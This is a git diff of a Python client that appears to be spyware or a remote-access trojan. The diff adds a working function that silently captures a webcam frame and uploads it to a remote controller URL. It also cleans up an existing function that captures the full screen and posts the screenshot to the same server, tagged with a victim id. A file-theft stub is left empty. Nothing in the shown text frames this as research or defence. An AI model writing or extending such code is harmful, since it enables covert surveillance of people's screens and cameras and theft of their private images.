@@ -2,11 +2,13 @@
 from dotenv import load_dotenv
 import os
 import requests
-import time 
+import time
 import socket
 import platform
 import mss
 import mss.tools
+import cv2
+
 
 class Agent():
     
@@ -33,26 +35,33 @@ class Agent():
             print(f"[-] FATAL ERROR: {e}")
     
     
-
     def get_screenshot(self):
         with mss.MSS() as sct:
-            png_bytes = mss.tools.to_png(
-                sct.grab(sct.monitors[0]).rgb,
-                sct.grab(sct.monitors[0]).size
-            )
+            shot = sct.grab(sct.monitors[0])
+            png_bytes = mss.tools.to_png(shot.rgb, shot.size)
         requests.post(
             self.pointurl + "/screenshot",
             files={"file": ("screenshot.png", png_bytes, "image/png")},
             data={"id": self.id}
         )
-            
 
-    def get_webcam():
+    def get_webcam(self):
+        cam = cv2.VideoCapture(0)
+        ret, frame = cam.read()
+        cam.release()
+        if not ret:
+            print("[-] Webcam not available")
+            return
+        _, buf = cv2.imencode(".png", frame)
+        requests.post(
+            self.pointurl + "/webcam",
+            files={"file": ("webcam.png", buf.tobytes(), "image/png")},
+            data={"id": self.id}
+        )
+
+    def get_files(self):
         pass
 
-    def get_files():
-        pass  
-    
     
 me = Agent()
        
